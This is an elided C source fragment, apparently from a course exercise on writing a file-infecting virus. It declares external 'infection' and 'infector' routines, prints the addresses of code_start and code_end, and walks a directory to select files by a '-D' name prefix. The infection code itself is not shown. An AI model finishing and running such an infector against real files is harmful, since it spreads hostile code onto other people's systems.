...
extern void infection(int num);
extern void infector(char* file_path);
...
int main (int argc , char* argv[], char* envp[])
{
  ...
  int arg, prefix_len, a_prefix_len;
  int debug = 0;
  int has_prefix = 0;
  int has_a_prefix = 0;
  ...
  for(arg = 1; arg < argc; arg++){
    if(strncmp(argv[arg], "-D", 2) == 0){
      ...
      a_prefix = argv[arg]+2;
      has_a_prefix = 1;
      a_prefix_len = strlen(a_prefix);
    }
  }

  /*prints the addresses of code start and code end*/
    my_printf(STDOUT, "\ncode_start address: ");
    my_printf(STDOUT, itoa((unsigned int)&code_start));
    my_printf(STDOUT, "\ncode_end address: ");
    my_printf(STDOUT, itoa((unsigned int)&code_end));
    my_printf(STDOUT, "\n");
  ...
  while(buffer_index < num_of_bytes_to_read){
    ...
    if((!has_prefix || strncmp(prefix, dirent->d_name, prefix_len) == 0) || (has_a_prefix && strncmp(a_prefix, dirent->d_name, a_prefix_len) == 0)){
    ...
    if(has_a_prefix && strncmp(a_prefix, dirent->d_name, a_prefix_len) == 0){
